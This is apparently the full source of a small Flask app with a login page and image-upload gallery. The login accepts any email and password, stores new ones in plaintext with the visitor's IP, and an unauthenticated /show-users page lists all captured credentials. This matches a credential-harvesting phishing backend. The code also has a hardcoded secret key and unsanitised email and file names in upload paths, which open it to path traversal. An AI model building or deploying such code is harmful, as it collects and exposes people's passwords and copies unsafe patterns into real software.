from flask import Flask, render_template, request, redirect, session, send_from_directory
import os
import psycopg2
from datetime import datetime

app = Flask(__name__)
app.secret_key = "supersecretkey"

UPLOAD_FOLDER = "static/uploads"
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# احصل على رابط قاعدة البيانات من متغير البيئة
DATABASE_URL = os.environ.get("DATABASE_URL")

def get_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    conn = get_connection()
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            email TEXT,
            password TEXT,
            ip TEXT,
            created_at TEXT
        )
    """)
    conn.commit()
    conn.close()

def save_user(email, password, ip):
    conn = get_connection()
    c = conn.cursor()
    c.execute("INSERT INTO users (email, password, ip, created_at) VALUES (%s, %s, %s, %s)",
              (email, password, ip, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

def user_exists(email, password):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE email=%s AND password=%s", (email, password))
    result = c.fetchone()
    conn.close()
    return result is not None

@app.route("/", methods=["GET", "POST"])
def login():
    visitor_ip = request.remote_addr
    if request.method == "POST":
        email = request.form["email"]
        password = request.form["password"]
        if not user_exists(email, password):
            save_user(email, password, visitor_ip)
        session["email"] = email
        user_folder = os.path.join(UPLOAD_FOLDER, email)
        os.makedirs(user_folder, exist_ok=True)
        return redirect("/upload")
    return render_template("login.html")

@app.route("/upload", methods=["GET", "POST"])
def upload():
    if "email" not in session:
        return redirect("/")
    email = session["email"]
    user_folder = os.path.join(UPLOAD_FOLDER, email)
    if request.method == "POST":
        for file in request.files.getlist("images"):
            if file:
                file.save(os.path.join(user_folder, file.filename))
    images = os.listdir(user_folder)
    return render_template("gallery.html", images=images, email=email)

@app.route("/uploads/<email>/<filename>")
def uploaded_file(email, filename):
    return send_from_directory(os.path.join(UPLOAD_FOLDER, email), filename)

@app.route("/show-users")
def show_users():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT email, password, ip, created_at FROM users ORDER BY id ASC")
    users = c.fetchall()
    conn.close()
    return render_template("users.html", users=users)

if __name__ == "__main__":
    init_db()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
